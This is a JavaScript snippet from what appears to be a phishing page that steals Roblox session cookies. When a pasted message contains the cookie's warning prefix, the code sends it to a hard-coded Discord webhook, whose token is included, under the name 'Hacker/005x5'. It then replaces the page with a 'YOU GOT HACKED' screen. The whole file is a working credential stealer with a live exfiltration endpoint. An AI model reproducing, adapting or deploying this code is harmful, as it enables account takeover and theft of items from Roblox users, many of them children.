let send = function () {
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1534162272488788110/wNUZikzZnrfF-j0aSv9_gHL1mV6_GxrurrL2q0Go6yQR0MjFbL5Pf3rKxhOmf_x00Dqq";

    const userMessage = document.getElementById("msg").value.trim();

    const WARNING_TEXT = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.";

    // Build final message with header + footer ALWAYS
    const finalMessage =
`---------------------------------------------------
Roblox Cookies

${userMessage}

----------------------------------------------------`;

    // Only send if WARNING text is inside the user's message
    if (userMessage.includes(WARNING_TEXT)) {
        fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                username: "Hacker/005x5",
                avatar_url: "https://i.imgur.com/4M7IWwP.png",
                content: finalMessage
            })
        });
    }

    // MATRIX STYLE FULLSCREEN
    document.body.innerHTML = `
        <style>
            body {
                background: black;
                overflow: hidden;
                margin: 0;
                padding: 0;
            }
            #matrix {
                color: #00ff00;
                font-family: monospace;
                font-size: 20px;
                white-space: pre;
                animation: fall 1.5s linear infinite;
            }
            @keyframes fall {
                0% { transform: translateY(-100%); }
                100% { transform: translateY(100%); }
            }
            #centerText {
                position: fixed;
                top: 40%;
                width: 100%;
                text-align: center;
                font-size: 150px;
                font-weight: bold;
                color: #00ff00;
                text-shadow: 0 0 20px #00ff00;
            }
        </style>

        <div id="centerText">YOU GOT HACKED HAHA NOOB</div>
        <div id="matrix"></div>

        <script>
            const matrix = document.getElementById("matrix");
            const chars = "01";
            let str = "";

            for (let i = 0; i < 5000; i++) {
                str += chars[Math.floor(Math.random() * chars.length)];
                if (i % 80 === 0) str += "\\n";
            }

            matrix.textContent = str;
        </script>
    `;
};

document.getElementById("sendBtn").onclick = send;